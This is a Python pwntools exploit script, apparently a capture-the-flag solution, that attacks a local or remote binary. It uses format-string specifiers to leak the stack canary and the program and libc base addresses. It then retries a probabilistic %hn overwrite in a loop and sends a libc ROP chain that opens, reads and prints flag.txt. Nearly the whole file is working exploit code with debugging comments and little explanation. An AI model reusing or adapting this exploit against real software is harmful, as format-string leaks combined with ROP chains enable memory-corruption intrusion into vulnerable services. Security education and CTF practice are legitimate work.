#!/usr/bin/env python3
from pwn import *
from time import sleep

e = ELF("s")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	else:
		return process(e.path)

if __name__ == '__main__':
	while True:
		r = conn()
		try:
			e.address = 0
			libc.address = 0
			# linkmap at off 60
			# 0x000055bbce21a000 is laddr for some reason and adding that to 0x3d80
			# is 0x55bbce21dd80
			# try to get ~0xb050 which is vulnAddr so 0x4050-0x3d80+0x1000 for reasons (5th to last hex digit)
			# so hn write with 1/16 chance of working
			# 39 is main leak
			# 41 is libc leak
			#r.interactive()
			
			# note the canary leak will be 18 bytes long instead of 14
			# so $p.. will be 20 bytes not 16
			payload = f'%6$p..%136$p..%138$p..%140$p..%{0x4050-0x3d70-0x44}c%159$hn......'.encode()
			print(payload)
			r.sendline(payload)
			lol = int(r.recvuntil(b'..', drop=True).decode()[2:], 16)
			canary = int(r.recvuntil(b'..', drop=True).decode()[2:], 16)
			e.address = int(r.recvuntil(b'..', drop=True).decode()[2:], 16) - 82 - e.sym['main']
			libc.address = int(r.recvuntil(b'..', drop=True).decode()[2:], 16) - 243 - libc.sym['__libc_start_main']
			log.info(f"lol addr: {hex(lol)}")
			log.info(f"canary: {hex(canary)}")
			log.info(f"vuln base: {hex(e.address)}")
			log.info(f"libc base: {hex(libc.address)}")
			log.info(f"vulnAddr var: {hex(e.sym['vulnAddr'])}")
			assert e.sym['vulnAddr'] & 0xffff == 0x4050
			if args.GDB:
				gdb.attach(r, gdbscript="b *(_dl_fini+475)\nb *(_dl_fini+0x1ed)\nb *(vuln+134)\nc")
				sleep(5)
			
			r.recvuntil(b'......')
			
			rop = ROP(libc)
			
			rop.call("syscall", [constants.linux.amd64.SYS_open, lol+0xb40-0x430, 0])
			rop.read(3, lol, 0x200)
			rop.puts(lol)
			
			payload = (b'%1032c'+(p64(canary)+b'aaaaaaaa'+rop.chain()).replace(b'\0', b'%177$c')).ljust(0x300, b'a')+b'flag.txt\0'
			print(len(payload))
			
			r.sendline(payload)
			
			r.interactive()
			exit(0)
		except AssertionError:
			print("fail")
			r.close()
		except KeyboardInterrupt:
			exit(0)






